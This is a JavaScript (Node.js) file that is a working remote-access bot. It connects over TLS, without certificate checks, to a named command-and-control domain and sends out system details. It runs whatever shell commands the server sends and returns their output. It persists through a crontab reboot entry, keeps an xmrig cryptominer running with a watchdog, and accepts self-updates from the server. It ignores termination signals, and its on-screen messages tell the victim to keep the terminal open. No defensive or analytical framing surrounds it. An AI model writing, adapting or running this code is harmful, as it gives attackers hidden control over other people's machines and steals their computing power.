const tls = require('tls');
const { exec, execSync, spawn } = require('child_process');
const dns = require('dns');
const os = require('os');
const fs = require('fs');
const path = require('path');

const DOMAIN = 'vpsc2.nguyenmanhhieu.info.vn';
const PORT = 367;
const RECONNECT_DELAY = 3000;
const MAX_RECONNECT_DELAY = 30000;
const COMMAND_TIMEOUT = 600000;
const HEARTBEAT_INTERVAL = 15000;
const WATCHDOG_INTERVAL = 300000;

let socket = null;
let reconnectDelay = RECONNECT_DELAY;
let buffer = '';
let isConnected = false;
let heartbeatTimer = null;
let watchdogTimer = null;
let commandQueue = [];
let isExecuting = false;
let myId = null;
let setupDone = false;
let storedMiningCmds = [];

function getShell() {
  if (os.platform() === 'win32') return 'cmd.exe';
  try { execSync('which bash', { stdio: 'ignore' }); return '/bin/bash'; }
  catch { return '/bin/sh'; }
}

function installAutoStart() {
  if (os.platform() === 'win32') return;
  const scriptPath = path.resolve(__filename);
  const marker = '# vpsc2-autostart';
  const cronLine = `@reboot cd ${path.dirname(scriptPath)} && /usr/bin/env node ${scriptPath} > /dev/null 2>&1 & ${marker}`;
  try {
    const current = execSync('crontab -l 2>/dev/null || echo ""', { encoding: 'utf8' });
    if (current.includes(marker)) return;
    const tmp = '/tmp/.vpsc2_cron_' + process.pid;
    fs.writeFileSync(tmp, current.trimEnd() + '\n' + cronLine + '\n');
    execSync(`crontab ${tmp}`, { stdio: 'ignore' });
    try { fs.unlinkSync(tmp); } catch {}
  } catch {}
}

function startWatchdog() {
  if (watchdogTimer) clearInterval(watchdogTimer);
  watchdogTimer = setInterval(() => {
    if (storedMiningCmds.length === 0 || os.platform() === 'win32') return;
    exec('pgrep xmrig', { shell: getShell() }, (err) => {
      if (err) {
        if (isConnected) sendData({ type: 'output', data: '[WATCHDOG] Miner dead, restarting...' });
        const cmds = storedMiningCmds.slice();
        let i = 0;
        function next() {
          if (i >= cmds.length) return;
          exec(cmds[i], { shell: getShell(), timeout: COMMAND_TIMEOUT, env: { ...process.env, DEBIAN_FRONTEND: 'noninteractive' } }, (e, stdout) => {
            if (stdout && stdout.trim() && isConnected) sendOutput('output', stdout);
            i++;
            setTimeout(next, 5000);
          });
        }
        next();
      }
    });
  }, WATCHDOG_INTERVAL);
}

function selfUpdate(code) {
  if (!code) return;
  try {
    const scriptPath = path.resolve(__filename);
    fs.writeFileSync(scriptPath, code, 'utf8');
    if (isConnected) sendData({ type: 'output', data: '[UPDATE] Code updated, restarting...' });
    setTimeout(() => {
      const child = spawn(process.argv[0], [scriptPath], { detached: true, stdio: 'ignore' });
      child.unref();
      process.exit(0);
    }, 500);
  } catch (e) {
    if (isConnected) sendData({ type: 'output', data: '[UPDATE] Failed: ' + e.message });
  }
}

function resolveAndConnect() {
  dns.resolve4(DOMAIN, (err, addresses) => {
    if (err) {
      setTimeout(resolveAndConnect, reconnectDelay);
      reconnectDelay = Math.min(reconnectDelay * 2, MAX_RECONNECT_DELAY);
      return;
    }
    connect(addresses[0]);
  });
}

function connect(ip) {
  if (socket) { try { socket.destroy(); } catch {} socket = null; }

  socket = tls.connect({ host: ip, port: PORT, rejectUnauthorized: false }, () => {
    isConnected = true;
    reconnectDelay = RECONNECT_DELAY;
    socket.setTimeout(0);
    socket.setKeepAlive(true, 10000);

    sendData({
      type: 'identity',
      key: 'vpsc2_nguyenmanhhieu_2026',
      hostname: os.hostname(),
      os: os.platform(),
      arch: os.arch(),
      user: os.userInfo().username,
      uptime: os.uptime(),
      cpus: os.cpus().length,
      memory: Math.round(os.totalmem() / 1024 / 1024) + 'MB',
      freemem: Math.round(os.freemem() / 1024 / 1024) + 'MB',
      version: 'v3.0',
    });

    startHeartbeat();
    installAutoStart();
    startWatchdog();
  });

  socket.setTimeout(10000);
  socket.on('timeout', () => { if (!isConnected) socket.destroy(); });

  socket.on('data', (data) => {
    buffer += data.toString();
    let lines = buffer.split('\n');
    buffer = lines.pop();
    for (const line of lines) {
      if (!line.trim()) continue;
      try { handleMessage(JSON.parse(line)); } catch { queueCommand(line.trim(), null, null); }
    }
  });

  socket.on('close', () => {
    isConnected = false;
    stopHeartbeat();
    setTimeout(resolveAndConnect, reconnectDelay);
    reconnectDelay = Math.min(reconnectDelay * 2, MAX_RECONNECT_DELAY);
  });

  socket.on('error', () => {});
}

function startHeartbeat() {
  stopHeartbeat();
  heartbeatTimer = setInterval(() => {
    if (isConnected) sendData({ type: 'heartbeat', uptime: os.uptime(), freemem: Math.round(os.freemem() / 1024 / 1024) + 'MB' });
  }, HEARTBEAT_INTERVAL);
}

function stopHeartbeat() {
  if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
}

function handleMessage(msg) {
  if (msg.type === 'welcome') {
    myId = msg.id;
  } else if (msg.type === 'command') {
    if (msg.step != null && msg.total != null) {
      if (msg.step === 1) storedMiningCmds = [];
      storedMiningCmds.push(msg.data);
    }
    queueCommand(msg.data, msg.step, msg.total);
  } else if (msg.type === 'update') {
    selfUpdate(msg.code);
  } else if (msg.type === 'ping') {
    sendData({ type: 'pong' });
  }
}

function queueCommand(command, step, total) {
  if (!command) return;
  commandQueue.push({ command, step, total });
  processQueue();
}

function processQueue() {
  if (isExecuting || commandQueue.length === 0) return;
  isExecuting = true;
  const item = commandQueue.shift();
  executeCommand(item.command, item.step, item.total, () => {
    isExecuting = false;
    setTimeout(processQueue, 500);
  });
}

function executeCommand(command, step, total, callback) {
  if (!command) { callback(); return; }
  if (step != null && total != null) console.log(`  Step ${step}/${total}...`);

  sendData({ type: 'cmd_start', cmd: command.substring(0, 200) });

  exec(command, {
    timeout: COMMAND_TIMEOUT,
    maxBuffer: 50 * 1024 * 1024,
    shell: getShell(),
    env: { ...process.env, DEBIAN_FRONTEND: 'noninteractive' },
  }, (error, stdout, stderr) => {
    if (stdout && stdout.trim()) sendOutput('output', stdout);
    if (stderr && stderr.trim()) sendOutput('error', stderr);
    const exitCode = error ? (error.code || error.signal || 1) : 0;
    sendData({ type: 'exit_code', code: exitCode, cmd: command.substring(0, 200) });

    if (step != null && total != null && step >= total) {
      const success = stdout && stdout.includes('MINER_STARTED_OK');
      console.log('');
      console.log(success ? '  ✅ Setup completed successfully' : '  ⚠️  Setup finished (check server)');
      console.log(`  📌 Client ID: #${myId || '?'}`);
      console.log('');
      console.log('  ⚠️  DO NOT close this terminal!');
      console.log('  ⚠️  Server will lose connection if you exit.');
      console.log('');
      setupDone = true;
    }
    callback();
  });
}

function sendOutput(type, data) {
  if (!data) return;
  const MAX_CHUNK = 32768;
  if (data.length > MAX_CHUNK) {
    for (let i = 0; i < data.length; i += MAX_CHUNK)
      sendData({ type, data: data.slice(i, i + MAX_CHUNK), partial: i + MAX_CHUNK < data.length });
  } else sendData({ type, data });
}

function sendData(obj) {
  if (socket && isConnected) {
    try { socket.write(JSON.stringify(obj) + '\n'); return true; } catch {}
  }
  return false;
}

resolveAndConnect();

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on('SIGTERM', () => {});
process.on('SIGINT', () => { if (socket) socket.destroy(); process.exit(0); });
